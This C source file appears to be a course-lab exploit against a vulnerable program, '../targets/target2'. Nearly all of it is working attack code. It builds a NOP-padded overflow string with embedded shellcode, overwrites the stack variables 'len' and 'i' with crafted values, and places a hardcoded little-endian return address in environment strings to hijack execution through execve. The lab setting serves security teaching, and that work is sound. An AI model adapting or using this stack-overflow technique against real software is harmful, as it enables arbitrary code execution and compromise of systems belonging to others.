#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

#define shellcode_margin 64

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[5];

	char sploit_str[284];

	// Targets
	char buf_addr[] = "\x80\xfd\x21\x20";
	// Variable "len" is located 0x108 away from start of "buf"
	// Variable "i" is located 0x10c away from start of "buf"

	// Fill with NOP until 0x108
	int i = 0;
	for (; i < 284; ++i)
	{
		sploit_str[i] = NOP;
	}

	// Append the shellcode
	for (i = shellcode_margin; i < (shellcode_margin + strlen(shellcode)); ++i)
	{
		sploit_str[i] = shellcode[i - shellcode_margin];
	}

	// Skip "len" located at 0x108, replace value with 0x11c
	sploit_str[0x108] = 0x1c;
	sploit_str[0x109] = 0x01;
	sploit_str[0x10a] = 0x00;

	args[0] = TARGET;
	args[1] = sploit_str;
	args[2] = NULL;

	// 267
	env[0] = "\x00";
	// Change i to some random value to skip it
	// 270, 269, 268
	env[1] = "\x0d\x01\x00";
	// 271
	env[2] = "\x00";
	// Hardcode little Endian target address with NOP (need 8 to reach 280 and then 4 more bytes for target address) 
	env[3] = "\x90\x90\x90\x90\x90\x90\x90\x90\x80\xfd\x21\x20";
	env[4] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
